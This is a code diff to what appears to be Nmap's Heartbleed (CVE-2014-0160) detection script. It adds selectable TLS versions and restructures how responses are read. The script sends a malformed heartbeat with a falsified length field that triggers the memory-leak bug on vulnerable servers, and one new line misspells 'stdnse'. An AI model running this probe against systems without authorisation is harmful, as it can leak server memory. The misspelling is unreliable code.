@@ -24,6 +24,8 @@ The code is based on the Python script ssltest.py authored by Jared Stafford (js
 -- |_      http://cvedetails.com/cve/2014-0160/
 --
 --
+-- @args ssl-heartbleed.protocols (default tries all) SSL 3.0, TLS 1.0, TLS 1.1, or TLS 1.2
+--
 
 local bin = require('bin')
 local match = require('match')
@@ -39,46 +41,37 @@ author = "Patrik Karlsson <patrik@cqure.net>"
 license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
 categories = { "vuln", "safe" }
 
+local arg_protocols = stdnse.get_script_args(SCRIPT_NAME .. ".protocols") or {'TLS 1.0', 'TLS 1.1', 'TLS 1.2'}
+
 portrule = function(host, port)
-  return shortport.ssl(host, port) or sslcert.isPortSupported(port)
+  result = false
+  pcall(function () result = shortport.ssl(host, port) or sslcert.isPortSupported(port) end)
+  return result
 end
 
-local function recvmsg(s)
+local function recvhdr(s)
   local status, hdr = s:receive_buf(match.numbytes(5), true)
   if not status then
     stdnse.print_debug(3, 'Unexpected EOF receiving record header - server closed connection')
     return
   end
   local pos, typ, ver, ln = bin.unpack('>CSS', hdr)
-  local pay
-  status, pay = s:receive_buf(match.numbytes(ln), true)
+  return status, typ, ver, ln
+end
+
+local function recvmsg(s, len)
+  local status, pay = s:receive_buf(match.numbytes(len), true)
   if not status then
     stdnse.print_debug(3, 'Unexpected EOF receiving record payload - server closed connection')
     return
   end
-  return true, typ, ver, pay
+  return true, pay
 end
 
-action = function(host, port)
-  local vuln_table = {
-    title = "The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.",
-    state = vulns.STATE.NOT_VULN,
-    risk_factor = "High",
-    description = [[
-OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
-    ]],
+local function testversion(host, port, version)
 
-    references = {
-      'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160',
-      'http://www.openssl.org/news/secadv_20140407.txt ',
-      'http://cvedetails.com/cve/2014-0160/'
-    }
-  }
-
-  local hello = bin.pack('H', table.concat(
+  local hello = bin.pack('HHH', "16", version, table.concat(
       {
-        "16", --handshake ContentType
-        "03 02", -- TLSv1.1
         "00 dc", -- record length
         "01", -- handshake type ClientHello
         "00 00 d8", -- body length
@@ -159,9 +152,7 @@ OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1
       })
     )
 
-  local hb = bin.pack('H', table.concat({
-        "18", -- Heartbeat ContentType
-        "03 02", -- TLSv1.1
+  local hb = bin.pack('HHH', '18', version, table.concat({
         "00 03", -- record length
         "01", -- HeartbeatType HeartbeatRequest
         "0f e9", -- payload length (falsified)
@@ -169,32 +160,41 @@ OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1
       })
     )
 
-  local report = vulns.Report:new(SCRIPT_NAME, host, port)
   local s = nmap.new_socket()
   s:set_timeout(5000)
-  s:connect(host, port, "tcp")
-  s:send(hello)
+  
+  if not s:connect(host, port, "tcp") then
+    stndse.print_debug(3, "Connection to server failed")
+    return
+  end
+
+  if not s:send(hello) then
+    stdnse.print_debug(3, "Failed to send packet to server")
+    return
+  end
 
   while(true) do
-    local status, typ, ver, pay = recvmsg(s)
+    local status, typ, ver, pay, len
+    status, typ, ver, len = recvhdr(s)
     if not status then
-      return report:make_output(vuln_table)
+      return
     end
+    status, pay = recvmsg(s, len)
     if ( typ == 22 and string.byte(pay,1) == 14 ) then break end
   end
 
   s:send(hb)
   while(true) do
-    local status, typ, ver, pay = recvmsg(s)
+    local status, typ, ver, len = recvhdr(s)
     if not status then
       stdnse.print_debug(3, 'No heartbeat response received, server likely not vulnerable')
       break
     end
     if typ == 24 then
+      status, pay = recvmsg(s, len)
       s:close()
       if #pay > 3 then
-        vuln_table.state = vulns.STATE.VULN
-        break
+        return true
       else
         stdnse.print_debug(3, 'Server processed malformed heartbeat, but did not return any extra data.')
         break
@@ -204,5 +204,49 @@ OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1
       break
     end
   end
+
+end
+
+action = function(host, port)
+  local vuln_table = {
+    title = "The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.",
+    state = vulns.STATE.NOT_VULN,
+    risk_factor = "High",
+    description = [[
+OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
+    ]],
+
+    references = {
+      'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160',
+      'http://www.openssl.org/news/secadv_20140407.txt ',
+      'http://cvedetails.com/cve/2014-0160/'
+    }
+  }
+
+  local versions = {
+    -- ['SSL 3.0'] = '03 00',
+    ['TLS 1.0'] = '03 01',
+    ['TLS 1.1'] = '03 02',
+    ['TLS 1.2'] = '03 03'
+  }
+
+  local report = vulns.Report:new(SCRIPT_NAME, host, port)
+  local test_vers = arg_protocols
+
+  if type(test_vers) == 'string' then
+    test_vers = { test_vers }
+  end
+
+  for _, ver in ipairs(test_vers) do
+    if nil == versions[ver] then
+      return "\n  Unsupported protocol version: " .. ver
+    end
+    local status = testversion(host, port, versions[ver])
+    if ( status ) then
+      vuln_table.state = vulns.STATE.VULN
+      break
+    end
+  end
+
   return report:make_output(vuln_table)
 end
